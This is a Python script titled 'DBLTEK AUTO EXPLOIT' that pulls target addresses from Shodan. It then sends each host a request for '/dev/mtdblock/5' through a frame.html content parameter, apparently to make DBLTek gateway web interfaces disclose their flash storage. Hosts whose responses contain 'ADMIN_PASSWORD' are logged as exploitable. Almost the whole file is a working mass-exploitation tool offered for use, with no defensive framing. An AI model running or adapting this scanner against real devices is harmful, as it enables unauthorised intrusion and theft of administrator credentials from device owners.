import shodan
import sys
import os
import time
import requests
import re
from pystyle import Anime, Colorate, Colors, Center, System, Write



ascii = '''
  ██▄   ███   █      ▄▄▄▄▀ ▄███▄   █  █▀ 
  █  █  █  █  █   ▀▀▀ █    █▀   ▀  █▄█   
  █   █ █ ▀ ▄ █       █    ██▄▄    █▀▄   
  █  █  █  ▄▀ ███▄   █     █▄   ▄▀ █  █  
  ███▀  ███       ▀ ▀      ▀███▀     █   
                                    ▀'''

banner = """
  ████████▄  ▀█████████▄   ▄█           ███        ▄████████    ▄█   ▄█▄ 
  ███   ▀███   ███    ███ ███       ▀█████████▄   ███    ███   ███ ▄███▀ 
  ███    ███   ███    ███ ███          ▀███▀▀██   ███    █▀    ███▐██▀   
  ███    ███  ▄███▄▄▄██▀  ███           ███   ▀  ▄███▄▄▄      ▄█████▀    
  ███    ███ ▀▀███▀▀▀██▄  ███           ███     ▀▀███▀▀▀     ▀▀█████▄    
  ███    ███   ███    ██▄ ███           ███       ███    █▄    ███▐██▄   
  ███   ▄███   ███    ███ ███▌    ▄     ███       ███    ███   ███ ▀███▄ 
  ████████▀  ▄█████████▀  █████▄▄██    ▄████▀     ██████████   ███   ▀█▀
                             press enter"""




System.Clear()
System.Title("DBLTEK AUTO EXPLOIT | BY DIVIN")
System.Size(200, 50)
Anime.Fade(text=Center.Center(banner), color=Colors.green_to_black, mode=Colorate.Diagonal, enter=True)

  

System.Clear()
print('\n'*2)
print(Colorate.Horizontal(Colors.green_to_black, Center.XCenter(ascii)))
print('\n'*3)  
# Configuration
try:
    os.remove("data.txt")
except:
    pass



file = open("data.txt", "w") 
API_KEY = ""

# Input validation
if len(sys.argv) == 1:
        print('Usage: %s <search query>' % sys.argv[0])
        sys.exit(1)


try:
        # Setup the api
        api = shodan.Shodan(API_KEY)

        # Perform the search
        query = ' '.join(sys.argv[1:])
        result = api.search(query, page=1)

        print('Results found: {}'.format(result['total']))
        

        # Loop through the matches and print each IP
        for service in result['matches']:

                
                print(str(service['ip_str']) + ":" + str(service['port']))

                fichier = open("data.txt", "a")

                fichier.write((service['ip_str']+ ":" +str(service['port'])+"\n"))

        print("ALL IP HAS BEEN COLLECTED")
except:
    print("y'a hagra avec shodan")

file = open('data.txt', "r")
for line in file:
    try:
        s = "ADMIN_PASSWORD"
        print("Requete sur "+(line))
        a = "http://"+line+"/default/en_US/frame.html?content=/dev/mtdblock/5".strip()
        a = a.replace('\n',"")
        r = requests.get(a)
        result = re.search(s, r.text)
        if result:
            hit = open("hit.txt", "a")
            hit.write(line)
            line = line.replace('\n',"")
            print(line+" exploitable")

 
        time.sleep(1.1)    

    except:
        pass


